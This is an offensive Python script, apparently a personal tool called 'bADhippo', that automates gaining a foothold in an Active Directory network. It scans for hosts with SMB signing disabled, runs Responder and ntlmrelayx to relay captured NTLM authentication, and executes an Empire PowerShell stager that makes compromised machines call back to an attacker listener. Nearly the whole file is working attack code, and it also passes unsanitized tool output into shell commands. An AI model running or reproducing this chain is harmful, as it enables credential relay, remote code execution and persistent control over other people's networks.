#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import argparse
import os
import threading
import signal
import sys
import re
from termcolor import colored
from argparse import RawTextHelpFormatter
from time import sleep
from requests import ConnectionError
import subprocess

from requests.packages.urllib3.exceptions import InsecureRequestWarning # Avoid Insecure message poping (thx deathstar writter)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning) 

class Nmap:

	"""Gestion de nmap"""

	def scan_smbsignin(self,ip):
		FNULL = open(os.devnull, 'w')
		process_nmap = subprocess.Popen(['nmap','-n','-Pn','-sS','--script','smb-security-mode.nse','-p445','-oA','smbhost',ip],stdout=FNULL,stderr=FNULL)
		sleep(6)
		process_grep = subprocess.check_output("grep open smbhost.gnmap |cut -d ' ' -f 2",shell=True)
		smbhost = []		
		for line in process_grep.split('\n'):
			process_egrep = subprocess.check_output("egrep -A 15 'for '" +line+ " smbhost.nmap |grep disabled |wc -l",shell=True)
			if process_egrep == "1\n":
				smbhost.append(line)
		return smbhost


class Empire:

	"""Gestion de Empire"""
	
	def lance_empire(self):
		FNULL = open(os.devnull, 'w')
		global process_empire
		self.process_empire = subprocess.Popen(['/root/BADHIPPO/Empire/empire','--rest','--username','topotam','--password','topotam'],stdout=FNULL,stderr=FNULL,cwd='/root/BADHIPPO/Empire/')
		if self.process_empire.pid is not None:
			print(u'[+] OK')
		else:
			print(u'[+] Erreur lors du lancement de Empire REST API !! ')
		sleep(2)

		
	def login(self,empire_username, empire_password):
		login = {'username': empire_username,'password': empire_password}
   		try:
			r = requests.post(base_url + '/api/admin/login', json=login, headers=headers, verify=False)
			if r.status_code == 200:
				token['token'] = r.json()['token']
				print(u'[+] OK')
			else:
				print('OUPS, quelque chose ne va pas (mauvais pass?!)')
				sys.exit(1)
		except ConnectionError:
			print('Connection Error') 
			sys.exit(1)

	def start_listener(self,listener_options):
		r = requests.post(base_url + '/api/listeners', params=token, headers=headers, json=listener_options, verify=False)
		if r.status_code == 200:
			return True
			print(u'[+] OK')
		else:
			print(u'[+] Erreur lors de la creation du Listener !!')
			exit(0)
			return False

	def get_listener_by_name(self,listener_name='bADhippo'):
		r = requests.get(base_url + '/api/listeners/{}'.format(listener_name), params=token, verify=False)
		if r.status_code == 200:
			return True
		else :
			return False

	def create_stager(self,stager_options):
		r = requests.post(base_url + '/api/stagers', params=token, headers=headers, json=stager_options, verify=False)
		if r.status_code == 200:
			r = r.json()['launcher']['Output']
			print('[+] OK')
		else:
			print('[+] Erreur lors de la creation du payload !!')
			exit(0)
		return r

	def get_agent_info(self):

		r = requests.get(base_url + '/api/agents', params=token, verify=False)
		if r.status_code == 200:
			return r.json()
		

	def print_agent(self):

		self.info = empire.get_agent_info()
		global boite
		boite = []
		for agent in self.info:
			for child in self.info[agent]:
				hostname = child['hostname']
				hostname = hostname[0:10]
				boite += child['ID'],'     '+hostname,'      '+ child['username'],'   '+child['internal_ip'],'   '+ child['process_name'],'/'+ child['process_id']+'\n'				
			try:
				if child['ID'] is not None:				
					print(u'[+] ID    Hostname        Username          IP Interne     ProcessName/ID')
					print(u'[+] --    --------        --------          ------------   --------------')	
					self.str1 = ''.join(str(e) for e in boite)
					print self.str1
					return True			
			except:
				return False

		

class Responder:

	"""Gestion de Responder"""

	def lance_pour_relay(self):
		FNULL = open(os.devnull, 'w')		
		self.process_responder = subprocess.Popen(['python','/root/BADHIPPO/Responder/Responder.py','-I','eth0','-r','-d','-w'],stdout=FNULL,stderr=FNULL,cwd='/root/BADHIPPO/Responder/')
		if self.process_responder.pid is not None:
			print(u'[+] OK')
		else:
			print(u'[+] Erreur lors du lancement de Responder !! ')

class Ntlmrelayx:
	
	"""Gestion de NTLMrelayx"""

	def relays_full_users(self,payload_base):
		FNULL = open(os.devnull, 'w')
		self.process_relayx = subprocess.Popen(['python','/root/BADHIPPO/impacket/examples/ntlmrelayx.py','-tf','host.txt','-c',payload_base],stdout=FNULL,stderr=FNULL,cwd='/root/BADHIPPO/impacket/examples/')
		if self.process_relayx.pid is not None:
			print(u'[+] OK')
		else:
			print('[+] Erreur lors du lancement de NTLMrelayx !! ')

args = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter)
args.add_argument('-u', '--username', type=str, default='topotam', help='Empire API username (default: topotam)')
args.add_argument('-p', '--password', type=str, default='topotam', help='Empire API password (default: topotam)')
args.add_argument('-lp', '--listener-port', type=int, default=8080, metavar='PORT', help='Port to start the bADhippo listener on (default: 8080)')
args.add_argument('-lip', '--listener-ip', type=str, default='192.168.1.47', help='IP to start the bADhippo listener on (default: 192.168.1.47)')
args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL (default: https://127.0.0.1:1337)')
args = args.parse_args()

sleep(3)
os.system('clear')

headers = {'Content-Type': 'application/json'}
token = {'token': None}
stager_options = {"StagerName":"launcher", "Listener":"bADhippo"}
base_url = args.url
implant = {}
listener_ip = args.listener_ip

print('[----------------------------- My bADhippo ----------------------------]')
print('[------------ The automated foothold gainer and AD pwning -------------]') 
print('[----------------- Using Responder, NTLMrelay, Empire -----------------]')
print('[----------------------------------------------------------------------]')
print('[----------------------------------------------------------by topotam--]')

empire = Empire()
responder = Responder()
relay = Ntlmrelayx()
nmap = Nmap()

print(u'[+] Lancement de Empire REST API ')
empire.lance_empire()

print(u'[+] Connection à Empire API' )
empire.login(args.username, args.password)

print(u'[+] Verification du listener bADhippo' )
if empire.get_listener_by_name():
	print(u'[+] OK')
else:
	print(u'[+] Création du listener bADhippo')
	empire.start_listener({'Name': 'bADhippo', 'Port': args.listener_port, 'Host':'http://'+listener_ip})
		

print(u'[+] Check si des agents sont deja connectés')
if empire.print_agent() is True:
	print(u'[+] Utiliser le/les agents deja connectés pour DA hunting ?! (y/n)')	
	choix = raw_input('[+] ---> ')
	if choix == 'y':
		pass
	else:
		pass
else:
	print(u'[+] Aucuns agents connectés, entrer l\'ip ou la range d\'ip à attaquer (ex:192.168.1.0/24)')
	ip_a_check = raw_input('[+] ---> ')
	print(u'[+] Verification du SMB Signing sur les hosts')
	ip_smb = nmap.scan_smbsignin(ip_a_check)
	print(u'[+] Les hosts suivants ont SMBSignin de desactivé : ' + ' '.join(ip_smb))	
	print(u'[+] Creation du payload powershell pour NTLMrelayx..')
	payload_base = empire.create_stager(stager_options)

	print(u'[+] Lancement de Responder')
	responder.lance_pour_relay()

	print(u'[+] Lancement de NTLMrelayx')
	relay.relays_full_users(payload_base)	

	while True:
		for agent in empire.get_agent_info()['agents']:
			agent_name = agent['name']
			if agent_name not in implant.keys():
				print('[+] WoOWoOt E.T telephone maison!! ')
				print('[+] ---> Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['name'],agent['external_ip'],agent['hostname'], agent['username'],agent['high_integrity']))
				implant[agent_name] = {
					'id': agent['ID'],
					'ip': agent['external_ip'],
					'hostname': agent['hostname'],
					'username': agent['username'],
					'integrity': agent['high_integrity'],
					'os': agent['os_details']}
		sleep(5)


empire.process_empire.kill()
responder.process_responder.kill()
relay.process_relayx.kill()





